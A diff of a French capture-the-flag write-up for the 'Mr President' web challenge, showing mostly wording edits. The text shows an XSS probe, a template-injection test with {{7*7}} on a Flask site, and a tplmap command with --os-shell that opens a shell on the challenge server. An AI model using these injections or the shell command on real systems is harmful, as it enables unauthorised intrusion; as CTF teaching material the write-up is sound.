@@ -1,10 +1,10 @@
-** WEB - Mr President**
+** WEB - Mr President - 2500 **
 
 Le site mis à disposition est un générateur de texte sur une image de Trump.
 
 __Résolution :__
 
-Le mot qui est passé à la variable name en GET est affiché en gros sur l'image :
+Le mot qui est passé à la variable **name** en GET est affiché en gros sur l'image :
 
 ```
 http://mrpresident.sthack.fr/banish?name=Ryan
@@ -18,7 +18,7 @@ http://mrpresident.sthack.fr/banish?name=<script>alert(1)</script>
 
 Aucun formulaire de contact donc nous passons à autre chose.
 
-Si nous appelons une page qui n'existe pas le site nous retourne comme information qu'il est développé avec flask.
+Si nous appelons une page qui n'existe pas, le site nous retourne comme information qu'il est développé avec flask.
 
 On tente :
 
@@ -28,11 +28,9 @@ http://mrpresident.sthack.fr/banish?name=Ryan{{7*7}}
 
 Nous obtenons comme retour  : Ryan49
 
-Nous avons donc une template injection :
+Nous avons donc une template injection.
 
-[TPLMAP](https://github.com/epinna/tplmap)
-
-On récupère un shell avec TPLMAP:
+On récupère un shell avec [TPLMAP](https://github.com/epinna/tplmap) :
 
 ```BASH
 ./tplmap.py --os-shell -u 'http://mrpresident.sthack.fr/banish?name=Ryan'
